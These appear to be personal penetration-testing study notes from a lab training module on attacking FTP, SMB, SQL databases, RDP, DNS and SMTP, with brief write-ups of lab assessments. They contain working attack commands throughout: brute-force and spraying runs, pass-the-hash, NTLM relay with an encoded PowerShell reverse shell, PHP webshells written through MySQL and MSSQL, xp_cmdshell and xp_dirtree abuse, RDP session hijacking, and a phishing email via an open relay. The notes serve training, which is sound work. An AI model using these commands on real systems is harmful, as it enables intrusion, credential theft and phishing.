## FTP
The first thing we may want to look is anonymous login. This can be obtained with the `-sC` script with nmap or using the `ftp-anon` script. It can also be checked using the `ftp` client to login.

Anonymous Authentication:

```shell-session
Poiint@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
```
Once there if we have permission we can download or upload file. In our case we may want to upload shells.
Another common attack we can do is Brute Force. We can use hydra, or medusa:

Brute Forcing with Medusa

```shell-session
Poiint@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

Another attack that can be done with ftp is the  `FTP Bounche Attack`:
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

FTP Bounce Attack

```shell-session
Poiint@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

Modern FTP servers prevent this type of attack.


## SMB 
First of all we can enumerate with nmap with `-sC -sV` script so we can get SMB version, hostname, and operatying system. 
Here too we can have anonymous authentication (misconfiguration). If so, we can list shares:

File Share

```shell-session
Poiint@htb[/htb]$ smbclient -N -L //10.129.14.128
 ```
`-N` stands for No password, `-L` stands for listing. We can do this with a few tools, like smbmap, rpcclient and enum4linux(-ng). For readability i will not paste all of them here but you can check the cheatsheet. Here like ftp we can perform brute force with hydra and password spraying. `Password spraying` is a technique where we try one password per user every once a time, so we will avoid account lockouts.

Brute Forcing and Password Spray

```shell-session
Poiint@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
`--local-auth` must be specified if we want to authenticate the user to a non-domain joined computer, otherwise, we can omit it. We can also specify the `--continue-on-success` to keep spraying the process without stopping at the first valid match.

We can have `Remote Code Execute (RCE)` with SMB using the `PsExec` tool (from the windows systinternals, check module for more details). There are few implementantions, such as [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) or [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py), also metasploit module or crackmapexec (cme) can be used.

Impacket PsExec

```shell-session
Poiint@htb[/htb]$ impacket-psexec -h
```

Impacket PsExec

```shell-session
Poiint@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

To get RCE we need a valid credential and an IP address.
NB: I'm not sure but i think we need administrator privileges to do that, otherwise will fail.

CrackMapExec

```shell-session
Poiint@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
**Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

If we are in a network, some of them may share the same local administrator account. We can use cme to enumerate logged-on users on all machines:

Enumerating Logged-on Users

```shell-session
Poiint@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

We can also extract the SAM database hashes (i think we saw already how to do it)

Extract Hashes from SAM Database

```shell-session
Poiint@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

NOTE: again, i'm pretty sure administrator privilege is needed to do that.
If we are able to obtain hashes, we can do a Pass the Hash attack. (also check [[7a. Password Attacks Notes#Pass the Hash (PtH)]]).

Pass-the-Hash (PtH)

```shell-session
Poiint@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

We can also create a fake SMB Server to capture users' NetNTLM v1/v2 hashes.
To do this, we can use tools like responder, or impacket-smbserver (not stated in the notes but i've used it and it worked. The one noted in the module is impacket-ntlmrelay):

Forced Authentication Attacks

```shell-session
Poiint@htb[/htb]$ responder -I <interface name> #ens33 or tun0 for ex
```

To crack these hashes, you can use hashcat:

```shell-session
Poiint@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell-session
Poiint@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

```shell-session
Poiint@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

```shell-session
Poiint@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGw <SNIP> AZQAoACkA'
```

We can create base64 powershell shell in [https://www.revshells.com/](https://www.revshells.com/). Remeber to start a nc listener in our machine.



## SQL Database
We usually have two common databases (relational) when dealing with systems. MySQL and MSSQL (Windows). So we will talk about both in this section.

`MSSQL` supports two authentication method: `Windows aunthentication mode` and `Mixed mode`. The same applies for `MySQL`.

MySQL - Connecting to the SQL Server

```shell-session
Poiint@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
```

Sqlcmd - Connecting to the SQL Server

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
#OR
C:\fiona> sqlcmd -H localhost #To access MSSQL from localhost
```

`sqsh` can  be used to access MSSQL database, but in my kali machine it does not seem to work correctly, so use this instead:

Sqlcmd - Connecting to the SQL Server

```shell-session
Poiint@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
```

These are default schemas/databases:

`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

Show Databases

```shell-session
mysql> SHOW DATABASES;
mssql 1> SELECT name FROM master.dbo.sysdatabases
mssql 2> GO (not necessary if logged in mssqlclient)
```

Select a Database

```shell-session
mysql> USE htbusers; #SAME for MSSQL
```

Show Tables

```shell-session
mysql> SHOW TABLES;
mssql 1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES 
# From now on i will omit the "GO" command for mssql. If the command does not #execute it's because u have to specify it, do not otherwise.
```

Select all Data from Table "users"

```shell-session
mysql> SELECT * FROM users; #SAME for MSSQL
```

XP_CMDSHELL (ONLY MSSQL)

```cmd-session
1> xp_cmdshell 'whoami'
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

These commands can also be executed in a linked-database, we will see it afterwards. MySQL does not have a procedure like xp_cmdshell, but we can get CE if we can write in the filesystem and get the commands be executed:

MySQL - Write Local File

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

#instead of 'c' we can also but a powershell or bash reverse shell inside the $_GET command. Use the revshells website to craft one.
```

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT â€¦ INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

MySQL - Secure File Privileges

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       | #No value, not secure, we can read and write everywher
+------------------+-------+
```

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

MSSQL - Enable Ole Automation Procedures

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

MSSQL - Create a File

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

Read Local Files in MSSQL

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

MySQL - Read Local Files in MySQL

```shell-session
mysql> select LOAD_FILE("/etc/passwd");
```

Before in SMB we talked about intercepting NTLM hashes with responder or impacked-smbserver. We can also steal MSSQL service account hash using `xp_subdirs` or `xp_dirtree`. 

XP_DIRTREE Hash Stealing

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\' #Remember to start Responder/smbserver
```
XP_SUBDIRS Hash Stealing

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\' #Remember to start Responder/smbserver
```

MSSQL Server hash a special permission, named `IMPERSONATE` that allows the executing user to take the permissions of another user or login until the context is reset or the sessions ends. First of all we need to indentify users that we can impersonate:

Identify Users that We Can Impersonate

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin
```

Verifying our Current User and Role

```cmd-session
1> SELECT SYSTEM_USER #The current User logged-in
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

julio                                                                                                                    

(1 rows affected)

-----------
	    0                  #0 means false, so no "sysadmin" privs.
```


Impersonating the SA User

```cmd-session
1> EXECUTE AS LOGIN = 'sa' #This will login as the user specified. 
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1               #1 means true, so "sa" has "sysdamin" privs.
```

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.
We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

Identify linked Servers in MSSQL

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. 

Identify linked Servers in MSSQL

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

## RDP
As SMB and FTP we can do password spraying:

Crowbar - RDP Password Spraying

```shell-session
Poiint@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

Hydra - RDP Password Spraying

```shell-session
Poiint@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

We can RDP into the target system using the `rdesktop` client or `xfreerdp` client with valid credentials.

RDP Login

```shell-session
Poiint@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143 #Or use xfreerdp
```

we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.



As shown in the example below, we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.
![](https://academy.hackthebox.com/storage/modules/116/rdp_session-1-2.png)

To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:

RDP Session Hijacking

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.

RDP Session Hijacking

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
```

To run the command, we can start the `sessionhijack` service :

RDP Session Hijacking

```cmd-session
C:\htb> net start sessionhijack
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-3-2.png)

_Note: This method no longer works on Server 2019._

What if we only have the NT hash of the user obtained from a credential dumping attack such as [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) database, and we could not crack the hash to reveal the plaintext password? In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`. (check [[7a. Password Attacks Notes#Pass the Hash (PtH)]]).

There are a few caveats to this attack:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
![](https://academy.hackthebox.com/storage/modules/116/rdp_session-4.png)

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:

Adding the DisableResrictedAdmin Registry Key

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

Adding the DisableResrictedAdmin Registry Key

```shell-session
Poiint@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

## DNS
Check also [[2a. Footprinting_notes#DNS]]. The methodology does not change that much. We try to do zone transfer, for example:

DIG - AXFR Zone Transfer

```shell-session
Poiint@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

DIG - AXFR Zone Transfer

```shell-session
Poiint@htb[/htb]# fierce --domain zonetransfer.me
```

`Domain takeover` is registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.

Domain takeover is also possible with subdomains called `subdomain takeover`. A DNS's canonical name (`CNAME`) record is used to map different domains to a parent domain. Many organizations use third-party services like AWS, GitHub, Akamai, Fastly, and other content delivery networks (CDNs) to host their content. In this case, they usually create a subdomain and make it point to those services. 

The domain name (e.g., `sub.target.com`) uses a CNAME record to another domain (e.g., `anotherdomain.com`). Suppose the `anotherdomain.com` expires and is available for anyone to claim the domain since the `target.com`'s DNS server has the `CNAME` record. In that case, anyone who registers `anotherdomain.com` will have complete control over `sub.target.com` until the DNS record is updated.

Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like [Subfinder](https://github.com/projectdiscovery/subfinder). This tool can scrape subdomains from open sources like [DNSdumpster](https://dnsdumpster.com/). Other tools like [Sublist3r](https://github.com/aboul3la/Sublist3r) can also be used to brute-force subdomains by supplying a pre-generated wordlist:

Subdomain Enumeration

```shell-session
Poiint@htb[/htb]# ./subfinder -d inlanefreight.com -v    
```

An excellent alternative is a tool called [Subbrute](https://github.com/TheRook/subbrute). This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.

Subbrute

```shell-session
Poiint@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
Poiint@htb[/htb]$ cd subbrute
Poiint@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
Poiint@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
#In resolvers we put IP ADDRESSES. Not very clear.
```

There's also DNS spoofing but i don't think it will be required, no exercises or labs did involve it. 

## SMTP

We can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.

We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:

Host - MX Records

```shell-session
Poiint@htb[/htb]$ host -t MX hackthebox.eu
```

DIG - MX Records

```shell-session
Poiint@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
```

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|

We can use `Nmap`'s default script `-sC` option to enumerate those ports on the target system:

DIG - A Record for MX

```shell-session
Poiint@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128
```

The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

VRFY Command

```shell-session
Poiint@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

(THERE is also example with EXPR and RCPT TO, omitted because it's basically the same thing).

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.

USER Command

```shell-session
Poiint@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.

[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365.

O365 Spray

```shell-session
Poiint@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
```

```shell-session
Poiint@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz   
```

We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.

Hydra - Password Attack

```shell-session
Poiint@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

O365 Spray - Password Spraying

```shell-session
Poiint@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

An open relay is a Simple Transfer Mail Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

Open Relay

```shell-session
Poiint@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

```shell-session
Poiint@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```


## Skill Assessment (LABS)

### Easy
Easy one was not really easy. Once you got the credentials with some enumeration & bruteforce, you could login to https and http. A .txt file gave you the directories of both webservers, and from http you could execute php file. So from mysql you could create a file with this script:
`<?php echo shell_exec($_GET['powershell -e BASE64']);?>`
by starting a nc listener you get a reverse shell once the php code is executed. The machine was of course a windows one.

### Medium
Not much to say. Internal ftp on port 30061 if im not wrong. Not exposed with a simple nmap scan, -p- flag is needed, the rest is really basic.

### Hard
This was very hard. Obtaining the credentials wasn't hard, but once you got it, you had to login to mssql with fiona, impersonate john and execute commands in the linked databases, that with john, you could execute privileged commands:

First of all, we needed to enable xp_cmdshell:

```mssql
-- To allow advanced options to be changed.  
EXECUTE ('sp_configure "show advanced options", 1') AT [LOCAL.TEST.LINKED.SRV]
GO

-- To update the currently configured value for advanced options.  
EXECUTE ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO  

-- To enable the feature.  
EXECUTE ('sp_configure "xp_cmdshell", 1') AT [LOCAL.TEST.LINKED.SRV]
GO  

-- To update the currently configured value for this feature.  
EXECUTE ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO
```

Then we could use xp_cmdshell to get the flag:


``` mssql
EXECUTE ('xp_cmdshell "type C:\Users\administrator\desktop\flag.txt"') AT [LOCAL.TEST.LINKED.SRV]
```

For the impersonating part, follow the notes, it's the same.